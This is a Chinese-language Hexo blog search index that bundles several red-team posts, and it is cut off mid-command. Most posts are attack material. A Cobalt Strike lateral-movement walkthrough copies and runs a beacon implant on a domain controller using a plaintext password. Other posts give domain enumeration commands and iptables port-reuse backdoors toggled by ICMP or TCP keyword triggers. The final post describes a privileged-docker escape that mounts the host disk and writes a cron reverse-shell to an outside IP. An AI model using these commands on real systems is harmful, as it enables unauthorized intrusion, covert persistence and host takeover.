<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Aggressor Script官方文档翻译-2.Cobalt Strike</title>
      <link href="2021/07/09/Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike/"/>
      <url>2021/07/09/Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="Aggressor-Script官方文档翻译-2-Cobalt-Strike"><a href="#Aggressor-Script官方文档翻译-2-Cobalt-Strike" class="headerlink" title="Aggressor Script官方文档翻译-2.Cobalt Strike"></a>Aggressor Script官方文档翻译-2.Cobalt Strike</h1><h2 id="Cobalt-Strike-客户端"><a href="#Cobalt-Strike-客户端" class="headerlink" title="Cobalt Strike 客户端"></a>Cobalt Strike 客户端</h2><p>Aggressor 脚本引擎是Cobalt Strike的集成特性(the glue feature). 大多数Cobalt Strike对话框和特性都是作为向Aggressor 脚本引擎公开某些接口的独立模块编写的。</p><p>Cobalt Strike中内置了一个默认的脚本, <a href="https://www.cobaltstrike.com/aggressor-script/default.cna">default.cna</a>, 这个脚本定义了Cobalt Strike的工具栏按钮，弹出式菜单，它还为大多数Cobalt Strike事件格式化输出。</p><p>本章将向您展示这些功能如何工作，并使您能够按照您的需求来塑造Cobalt Strike客户端。</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/defaultscript.png" alt="The default.cna script"></p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>脚本可以创建快捷键，使用bind关键字绑定快捷键。这个例子展示了当Ctrl和H同时按下时，在对话框中显示“**Hello World!**”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bind Ctrl+H &#123;</span><br><span class="line">show_message(&quot;Hello World!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709154617398.png" alt="image-20210709154617398"></p><p>快捷键可以是任何ASCII字符或特殊键。快捷键可以有一个或多个修饰符应用于它们，例如:Ctrl, Shift, Alt，或Meta。脚本可以指定修饰符+键。</p><h2 id="弹出式菜单"><a href="#弹出式菜单" class="headerlink" title="弹出式菜单"></a>弹出式菜单</h2><p>脚本也可以添加到Cobalt Strike的菜单结构或重新定义它。popup关键字为popup钩子构建菜单层次。</p><p>下面是定义Cobalt Strike帮助菜单的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">popup help &#123;</span><br><span class="line">        item(&quot;&amp;Homepage&quot;, &#123; url_open(&quot;https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;&quot;); &#125;);</span><br><span class="line">        item(&quot;&amp;Support&quot;,  &#123; url_open(&quot;https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;support&quot;); &#125;);</span><br><span class="line">        item(&quot;&amp;Arsenal&quot;,  &#123; url_open(&quot;https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;scripts&quot;); &#125;);</span><br><span class="line">        separator();    # 分隔线</span><br><span class="line">        item(&quot;&amp;System Information&quot;, &#123; openSystemInformationDialog(); &#125;);</span><br><span class="line">        separator();</span><br><span class="line">        item(&quot;&amp;About&quot;, &#123; openAboutDialog(); &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709155141293-1625817106180.png" alt="image-20210709155141293"></p><p>该脚本与Help popup钩子挂钩，并定义了几个菜单项。菜单项名称中的&amp;是它的快捷键（keyboard accelerator）。当用户单击每个项时，与它相关联的代码块将执行。</p><p>脚本也可以定义带有子元素的菜单。关键字menu定义了一个新菜单。当用户将鼠标悬停在菜单上时，将执行与它相关的代码块，并用于构建子菜单。</p><p>这是Pivot Graph（拓扑图）菜单的一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">popup pgraph &#123;</span><br><span class="line">       menu &quot;&amp;Layout&quot; &#123;</span><br><span class="line">item &quot;&amp;Circle&quot;    &#123; graph_layout($1, &quot;circle&quot;); &#125;</span><br><span class="line">item &quot;&amp;Stack&quot;     &#123; graph_layout($1, &quot;stack&quot;); &#125;</span><br><span class="line">menu &quot;&amp;Tree&quot; &#123;</span><br><span class="line">item &quot;&amp;Bottom&quot; &#123; graph_layout($1, &quot;tree-bottom&quot;); &#125;</span><br><span class="line">item &quot;&amp;Left&quot;   &#123; graph_layout($1, &quot;tree-left&quot;); &#125;</span><br><span class="line">item &quot;&amp;Right&quot;  &#123; graph_layout($1, &quot;tree-right&quot;); &#125;</span><br><span class="line">item &quot;&amp;Top&quot;    &#123; graph_layout($1, &quot;tree-top&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line">separator();</span><br><span class="line">item &quot;&amp;None&quot; &#123; graph_layout($1, &quot;none&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709155958173.png" alt="image-20210709155958173"></p><p>如果您的脚本为Cobalt Strike菜单钩子指定了一个菜单层次结构，它将添加到已经存在的菜单中。您也可以使用&amp;popup清除功能来清除其他注册菜单项，并重新定义一个符合您个人品位的菜单层次结构。</p><h2 id="自定义输出"><a href="#自定义输出" class="headerlink" title="自定义输出"></a>自定义输出</h2><p>Aggressor脚本中的set关键字定义了如何格式化事件并将其输出显示给用户。下面是set关键字的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set EVENT_SBAR_LEFT &#123;</span><br><span class="line">return &quot;[&quot; . tstamp(ticks()) . &quot;] &quot; . mynick();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set EVENT_SBAR_RIGHT &#123;</span><br><span class="line">return &quot;[lag: $1 $+ ]&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显示效果：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709161631047.png" alt="image-20210709161631047"></p><p>上面的代码定义了Cobalt Strike事件日志中状态栏的内容 (<strong>View -&gt; Event Log</strong>)。状态栏的左侧显示当前时间和昵称。右边显示Cobalt Strike客户端和团队服务器之间消息的往返时间。</p><p>您可以创建自己的文件来覆盖Cobalt Strike默认脚本中的任何设置选项，其中包含您所关心的事件的定义。把脚本加载进Cobalt Strike后Cobalt Strike将使用您的定义来构建。</p><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>使用on关键字来定义事件的处理程序。当Cobalt Strike连接到团队服务器并准备好时，ready事件就会触发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on ready &#123;</span><br><span class="line">show_message(&quot;Ready for action!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显示效果：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709162022551-1625818825432.png" alt="image-20210709162022551"></p><p>Cobalt Strike为各种情况生成事件。使用*元事件查看Cobalt Strike的所有事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">on * &#123;</span><br><span class="line">local(&#39;$handle $event $args&#39;);</span><br><span class="line"></span><br><span class="line">$event &#x3D; shift(@_);</span><br><span class="line">$args  &#x3D; join(&quot; &quot;, @_);</span><br><span class="line"></span><br><span class="line">$handle &#x3D; openf(&quot;&gt;&gt;eventspy.txt&quot;);</span><br><span class="line">writeb($handle, &quot;[ $+ $event $+ ] $args&quot;);</span><br><span class="line">closef($handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709162801522.png" alt="image-20210709162801522"></p><p>生成了事件日志。</p>]]></content>
      
      
      <categories>
          
          <category> Cobalt Strike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike插件开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jar包反编译和重打包</title>
      <link href="2021/06/21/Jar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91%E5%92%8C%E9%87%8D%E6%89%93%E5%8C%85/"/>
      <url>2021/06/21/Jar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91%E5%92%8C%E9%87%8D%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Jar反编译和重打包"><a href="#Jar反编译和重打包" class="headerlink" title="Jar反编译和重打包"></a>Jar反编译和重打包</h1><p><strong>使用jadx反编译</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jadx -d win win.jar</span><br></pre></td></tr></table></figure><p><strong>使用javac编译工程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -encoding utf8 -cp classes -d classes .&#x2F;src&#x2F;com&#x2F;jlcss&#x2F;ep&#x2F;*.java -classpath .&#x2F;lib&#x2F;swt.jar</span><br></pre></td></tr></table></figure><p><strong>重新打包</strong></p><p>将jar解压，替换classes后重新打包成zip文件，最后将后缀改成jar即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法</title>
      <link href="2021/05/11/Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>2021/05/11/Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>问题描述：</p><p><img src="Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.assets/image-20210511171538464-1620724541793.png" alt="image-20210511171538464"></p><p>解决办法：</p><p>因为Ubuntu默认使用的防火墙并不是iptables，所以使用iptables之前需要先禁用UFW。</p><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure><p>类似地，在CentOS 7服务器的情况下，防火墙也可能是冲突的一个原因。FirewallD默认包含在CentOS 7中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure><p>有时，在Ubuntu服务器中执行以下命令会返回一个无法识别的服务消息。</p><p>该命令基于/etc/init.d文件夹中iptables的启动脚本起作用。 通常，此命令适用于RHEL / Red Hat / CentOS。 在Ubuntu中，要保存防火墙规则的更改，我们使用以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;sbin&#x2F;iptables-save</span><br></pre></td></tr></table></figure><p>但是，如果坚持使用与以前相同的命令，我们可以在/etc/init.d文件夹中添加自定义的可执行启动脚本。 这样可以有效地解决错误。</p>]]></content>
      
      
      <categories>
          
          <category> iptables </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动</title>
      <link href="2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.2 /user:administrator <span class="string">&quot;JDredteam666&quot;</span></span><br><span class="line">shell net view \\10.10.10.2</span><br></pre></td></tr></table></figure><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170638929.png" alt="image-20210109170638929"></p><p>列出目标主机 C 盘下目录文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.2\C$</span><br></pre></td></tr></table></figure><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170959454.png" alt="image-20210109170959454"></p><p>将CS木马上传到跳板机。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)</span><br></pre></td></tr></table></figure><p>将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\Server\Desktop\beacon.exe \\10.10.10.2\C$</span><br></pre></td></tr></table></figure><p>远程创建Win 2012(192.168.200.66)目标机计划任务执行木马文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /s 10.10.10.2 /u administrator /p <span class="string">&quot;JDredteam&quot;</span> /sc MINUTE /mo 1 /tn <span class="built_in">test</span> /tr <span class="string">&quot;C:\\beacon.exe&quot;</span></span><br></pre></td></tr></table></figure><p>成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</p><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109202117004.png" alt="image-20210109202117004"></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域操作基本命令</title>
      <link href="2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="域操作基础命令"><a href="#域操作基础命令" class="headerlink" title="域操作基础命令"></a>域操作基础命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain                 获得所有域用户组列表</span><br><span class="line">net group xxxxx &#x2F;domain              显示域中xxxxx组的成员</span><br><span class="line">net group xxxxx &#x2F;del &#x2F;domain           删除域中xxxxx组</span><br><span class="line">net group xxxxx xy &#x2F;del &#x2F;domain          删除域内xxxxx 群组中的xy成员</span><br><span class="line">net group xxxxx &#x2F;add &#x2F;domain           增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain         获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain       获得企业管理员列表</span><br><span class="line">net localgroup administrators &#x2F;domain       获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain      获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain       获得所有域成员计算机列表</span><br><span class="line">net user &#x2F;domain                 获得所有域用户列表</span><br><span class="line">net user xxxx &#x2F;domain               获得指定账户xxxx的详细信息</span><br><span class="line">net accounts &#x2F;domain               获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">net view &#x2F;domain                 查询有几个域, 查询域列表</span><br><span class="line">net view &#x2F;domain:xxxx               查看 xxxx域中的计算机列表</span><br><span class="line">nltest &#x2F;domain_trusts               获取域信任信息</span><br><span class="line">net user domain-admin &#x2F;domain           查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation              查询机器属于哪个域</span><br><span class="line">net time &#x2F;domian                 查询主域服务器的时间</span><br><span class="line">echo %logonserver%                查看登陆到这台服务器的计算机名</span><br><span class="line">gpupdate&#x2F;force                  更新域策略</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V      查看远程计算机进程</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux利用iptables做端口复用</title>
      <link href="2021/04/20/Linux%E5%88%A9%E7%94%A8iptables%E5%81%9A%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"/>
      <url>2021/04/20/Linux%E5%88%A9%E7%94%A8iptables%E5%81%9A%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux利用iptables做端口复用"><a href="#Linux利用iptables做端口复用" class="headerlink" title="Linux利用iptables做端口复用"></a>Linux利用iptables做端口复用</h2><h3 id="方案一：-根据源地址做端口复用"><a href="#方案一：-根据源地址做端口复用" class="headerlink" title="方案一：(根据源地址做端口复用)"></a>方案一：(根据源地址做端口复用)</h3><p>以下这条命令的作用是将来自192.168.10.13的访问80端口的流量都重定向到22端口。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -s 192.168.10.13 --dport 80 -j REDIRECT --to-port 22</span><br></pre></td></tr></table></figure><p>但是这样做有一个问题就是，我们访问目标主机80端口的流量都会被转给22端口。如果我们不用访问该HTTP服务的话，这是一个好的办法。实战中，我们一般是用VPS连接不用访问HTTP服务，所以在实战中该方法用的比较多。</p><h3 id="方案二：-根据源地址源端口做端口复用"><a href="#方案二：-根据源地址源端口做端口复用" class="headerlink" title="方案二：(根据源地址源端口做端口复用)"></a>方案二：(根据源地址源端口做端口复用)</h3><p>以下的命令是根据源地址源端口做端口复用，也就是只有来自192.168.10.13主机的33333端口的访问80端口的流量会被转给22端口.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -s 192.168.10.13 --sport 33333 --dport 80 -j REDIRECT --to-port 22</span><br></pre></td></tr></table></figure><p>然后我们本机先用socat将本地44444端口的流量以源端口33333访问192.168.10.129的80，然后我们SSH本地的44444端口即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup socat tcp-listen:44444,fork,reuseaddr tcp:192.168.10.129:80,sourceport=33333,reuseaddr &amp;</span><br><span class="line">ssh -p 44444 root@127.0.0.1</span><br></pre></td></tr></table></figure><p>但是这样做有一个问题就是不支持多连接 如果想创建两个 SSH 连接就会出错，因为本地的33333 端口已经被第一个 SSH 连接占用了。</p><h3 id="方案三：-利用ICMP协议做遥控开关"><a href="#方案三：-利用ICMP协议做遥控开关" class="headerlink" title="方案三：(利用ICMP协议做遥控开关)"></a>方案三：(利用ICMP协议做遥控开关)</h3><p>利用 ICMP 做遥控开关。缺点在于如果目标在内网，你是无法直接 ping 到它的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N LETMEIN       <span class="comment">#创建端口复用链</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22  <span class="comment">#创建端口复用规则，将流量转发至 22 端口</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length1139 -m recent --<span class="built_in">set</span> --name letmein --rsource -j ACCEPT  <span class="comment">#开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为letmein的列表中</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length1140 -m recent --name letmein --remove -j ACCEPT      <span class="comment">#关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN   <span class="comment">#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启复用</span><br><span class="line">ping -c 1 -s 1111 192.168.10.129        <span class="comment">#向目标发送一个长度为 1111 的 ICMP 数据包（加上包头28，总长度实际为1139）</span></span><br><span class="line"></span><br><span class="line">关闭复用</span><br><span class="line">ping -c 1 -s 1112 192.168.10.129        <span class="comment">#向目标发送一个长度为 1112 的 ICMP 数据包（加上包头 28，总长度实际为 1140）</span></span><br></pre></td></tr></table></figure><h3 id="方案四：-利用TCP协议做遥控开关"><a href="#方案四：-利用TCP协议做遥控开关" class="headerlink" title="方案四：(利用TCP协议做遥控开关)"></a>方案四：(利用TCP协议做遥控开关)</h3><p>利用 tcp 数据包中的关键字做遥控开关，不怕目标在内网。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N LETMEIN    <span class="comment">#创建端口复用链</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 <span class="comment">#创建端口复用规则，将流量转发至 22 端口</span></span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">&#x27;threathuntercoming&#x27;</span> --algo bm -m recent --<span class="built_in">set</span> --name letmein --rsource -j ACCEPT  <span class="comment">#开启开关，如果接收到一个含有threathuntercoming的TCP包，则将来源 IP 添加到加为letmein的列表中</span></span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp -m string --string <span class="string">&#x27;threathunterleaving&#x27;</span> --algo bm -m recent --name letmein --remove -j ACCEPT    <span class="comment">#关闭开关，如果接收到一个含有threathunterleaving的TCP包，则将来源 IP 从letmein的列表中移除</span></span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN   <span class="comment">#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH</span><br><span class="line"><span class="built_in">echo</span> threathuntercoming | socat - tcp:192.168.10.129:80</span><br><span class="line"></span><br><span class="line">关闭复用，关闭后，80 恢复正常：</span><br><span class="line"><span class="built_in">echo</span> threathunterleaving | socat - tcp:192.168.10.129:80</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker逃逸</title>
      <link href="2021/04/19/docker%E9%80%83%E9%80%B8/"/>
      <url>2021/04/19/docker%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="使用特权模式启动容器的docker逃逸方法"><a href="#使用特权模式启动容器的docker逃逸方法" class="headerlink" title="使用特权模式启动容器的docker逃逸方法"></a>使用特权模式启动容器的docker逃逸方法</h1><p>使用特权模式启动镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged 2c047404e52d /bin/bash</span><br></pre></td></tr></table></figure><p>考虑到部署环境时大多使用vulhub的镜像，所以这里给出修正方案是在docker-compose.yml文件中添加一个字段，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privileged: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106133232264.png" alt="image-20210106133232264"></p><p>修改完成后执行如下命令启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>通过漏洞利用拿到docker 容器的shell后：</p><p>查看磁盘文件：fdisk -l</p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106102824909.png" alt="image-20210106102824909"></p><p> 从返回结果来看sda1、sda2、sda5在/dev目录下。 </p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106102909850.png" alt="image-20210106102909850"></p><p>新建一个目录/test，将/dev/sda5挂载到新建的目录下，并查看test目录下的内容，发现可以访问宿主机上/目录下的内容了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ./<span class="built_in">test</span></span><br><span class="line">mount /dev/sda5 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106103015017.png" alt="image-20210106103015017"> </p><p>将反弹shell的命令写成一个脚本crontabshell存在/tmp下面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建shell脚本文件</span></span><br><span class="line">touch ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="comment">#写入反弹shell命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/bin/bash&quot;</span> &gt; ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.20.133/8888 0&gt;&amp;1 &amp;&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">chmod 755 ./<span 